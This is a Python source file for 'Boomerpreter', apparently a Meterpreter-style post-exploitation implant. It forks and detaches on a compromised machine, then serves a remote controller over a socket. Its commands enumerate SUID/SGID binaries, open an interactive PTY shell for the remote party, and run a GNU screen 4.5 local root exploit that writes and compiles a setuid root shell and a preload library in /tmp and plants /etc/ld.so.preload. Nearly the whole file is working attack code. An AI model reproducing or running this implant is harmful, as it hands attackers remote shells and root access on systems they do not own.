import subprocess
import socket
from platform import python_version
import glob
import stat
import os
import sys
import time
import threading
import platform
import json

try:
    import pty
    has_pty = True
except:
    has_pty = False

try:
    import termios
    has_termios = True
except:
    has_termios = False


class Boomerpreter:
    def __init__(self,s):
        self.socket = s
        self.channel = None
        self.platform_os = platform.platform()
        self.py_version = 3 if python_version().startswith("3") else 2
        self.options = {
        "suid_sgid": "get_suid_sgid",
        "exit": "exit",
        "shell": "get_shell",
        "root_screen45": "exploit_screen45"
        }

    def run(self):
        self.socket.send(self.platform_os.encode())
        while True:
            data_rcv = self.recv_data()
            func = data_rcv["function"]
            args = data_rcv["args"]
            try:
                opt = self.options[func]
                if opt:
                    data = getattr(self, opt)(args)
            except Exception as e:
                data = "Error: Operation " + str(e) + " not found"
            if not data:
                continue
            if "exit" == data:
                break
            self.send_data(data)


    def recv_data(self):
        data = self.socket.recv(1024)
        #if self.py_version == 3:
        data = data.decode()
        return json.loads(data)
    
    def send_data(self, data):
        data = json.dumps(data)
        #if self.py_version == 3:
        data = data.encode()
        self.socket.send(data)
    
    def exit(self):
        try:
            self.socket.close()
        except:
            pass
        return "exit"

    # CALL FUNCTIONS BEGIN
   
    def get_suid_sgid(self, request):
        if len(request) == 0:
            return "Error: This function needs args"
        files = ""
        for my_dir in request:
            files_suid = []
            files_sgid = []
            files += "[__ " + my_dir + " __]"
            try:
                for f in os.listdir(my_dir):
                    aux_file = os.path.join(my_dir, f)
                    if os.path.isfile(aux_file):
                        result = self._is_suid_sgid(aux_file)
                        if result[0]:
                            files_suid.append(result[0])
                        if result[1]:
                            files_sgid.append(result[1])
            except:
                files += "Non-existing directory"
                continue
            files_suid = "\n".join(files_suid)
            files_sgid = "\n".join(files_sgid)
            files += "\n---SUID---\n" +files_suid + "\n---SGID---\n" + files_sgid
        return files

    def get_shell(self, request):
        if len(request) == 0:
            request = '/bin/sh'
        else:
            request = request[0]
        if has_pty:
            cmd = ['/bin/sh', '-c', request] 
            master, slave = pty.openpty()
            if has_termios:
                settings = termios.tcgetattr(master)
                settings[3] = settings[3] & ~termios.ECHO
                termios.tcsetattr(master, termios.TCSADRAIN, settings)
            channel = STDProcess(cmd, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
            channel.stdin = os.fdopen(master, 'wb')
            channel.stdout = os.fdopen(master, 'rb')
            channel.stderr = open(os.devnull, 'rb')
            channel.start()
            read = True
            while True:
                if not read:
                    recv = self.socket.recv(1024)
                    if len(recv) == 0:
                        break
                    if b"exit" in recv:
                        return None
                    channel.write(recv)
                read = False
                data = bytes()
                if channel.stderr_reader.is_read_ready():
                    data = channel.stderr_reader.read()
                elif channel.stdout_reader.is_read_ready():
                    data = channel.stdout_reader.read()
                elif channel.poll() != None:
                    self.socket.send(b"bye")
                    return None
                if data:
                    self.socket.sendall(data)
                else:
                    read = True
                time.sleep(1)
        else:
            return "No"
        
    def exploit_screen45(self, request):
        try:
            self.treat_files_screen45()
        except:
            return "Error creating files"
        try:
            self.compile_files_screen45()
        except:
            return "Error compiling files"
        return "ok"
        
    # CALL FUNCTIONS END

    # AUXILIAR FUNCTIONS BEGIN

    def _is_suid_sgid(self, file_name):
        results = []
        try:
            f = os.stat(file_name)
            mode = f.st_mode
        except:
            return [None, None]
        if (mode & stat.S_ISUID) == 2048:
            results.append(file_name)
        else:
            results.append(None)
        if (mode & stat.S_ISGID) == 1024:
            results.append(file_name)
        else:
            results.append(None)
        return results
    
    def treat_files_screen45(self):
        libhax = open("/tmp/libhax.c", "w")
        libhax.write('''
            #include <stdio.h>
            #include <sys/types.h>
            #include <unistd.h>
            __attribute__ ((__constructor__))
            void dropshell(void){
                chown("/tmp/shell", 0, 0);
                chmod("/tmp/shell", 04755);
                uid_t getuid(void){
                    return 0;
                }
                
            }
            ''')
        libhax.close()
        shell = open("/tmp/shell.c", "w")
        shell.write('''
                #include <stdio.h>
                int main(void){
                unlink("/etc/ld.so.preload");
                execvp("/bin/sh", NULL, NULL);
                }
                ''')
        shell.close()

    def compile_files_screen45(self):
        os.popen("""
            screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
            screen -D -m gcc -z execstack -o /tmp/shell /tmp/shell.c 2> /dev/null;
            rm -f /tmp/shell.c; rm -f /tmp/libhax.c
            """)
        os.popen('''
            umask 0;
            screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
            ''')
        time.sleep(3)
        os.system("screen -lsq 2>&1 >/dev/null")
    
     # AUXILIAR FUNCTIONS END


#Thanks Metasploit
class STDProcessBuffer(threading.Thread):
    def __init__(self, std, is_alive):
        threading.Thread.__init__(self)
        self.std = std
        self.is_alive = is_alive
        self.data = bytes()
        self.data_lock = threading.RLock()

    def run(self):
        for byte in iter(lambda: self.std.read(1), bytes()):
            self.data_lock.acquire()
            self.data += byte
            self.data_lock.release()

    def is_read_ready(self):
        return len(self.data) != 0

    def peek(self, l = None):
        data = bytes()
        self.data_lock.acquire()
        if l == None:
            data = self.data
        else:
            data = self.data[0:l]
        self.data_lock.release()
        return data

    def read(self, l = None):
        self.data_lock.acquire()
        data = self.peek(l)
        self.data = self.data[len(data):]
        self.data_lock.release()
        return data

#Thanks Metasploit
class STDProcess(subprocess.Popen):
    def __init__(self, *args, **kwargs):
        subprocess.Popen.__init__(self, *args, **kwargs)
        self.echo_protection = False

    def start(self):
        self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
        self.stdout_reader.start()
        self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
        self.stderr_reader.start()

    def write(self, channel_data):
        self.stdin.write(channel_data)
        self.stdin.flush()
        
# s is the socket
address = s.getpeername()
if hasattr(os, 'fork'):
    pid = os.fork()
    if pid > 0:
        print("Meterpreter is running!") #test purposes
        sys.exit(0)

    if pid == 0:  
        if hasattr(os, 'setsid'):
            try:
                os.setsid()
            except OSError:
                pass


try:
    boomerpreter = Boomerpreter(s)
    boomerpreter.run()
except:
    pass